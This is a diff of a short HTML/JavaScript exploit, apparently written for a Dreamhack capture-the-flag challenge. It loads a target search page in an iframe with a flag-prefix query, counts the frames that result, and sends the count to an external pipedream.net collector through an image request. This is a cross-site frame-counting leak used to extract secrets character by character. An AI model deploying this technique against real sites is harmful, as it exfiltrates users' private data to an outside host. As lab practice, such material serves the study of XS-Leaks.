@@ -1,10 +1,9 @@
-<iframe src></iframe>
+<iframe id="iframe"></iframe>
 <img id="img">
 <script>
-    var iframe = document.createElement("iframe");
-    iframe.src = "http://host3.dreamhack.games:8825/search?query=DreamHack";
-    document.body.appendChild(iframe);
-    iframe.onload = ()=>{
-        img.src=`http://en7007nj6j2rg.x.pipedream.net/?count=${iframe.contentWindow.frames.length}`
-    };
+const iframe = document.getElementById("iframe");
+iframe.src = "http://localhost:8000/search?query=DH{";
+iframe.onload = () => {
+    img.src = `https://en7007nj6j2rg.x.pipedream.net/${iframe.contentWindow.frames.length}`;
+};
 </script>
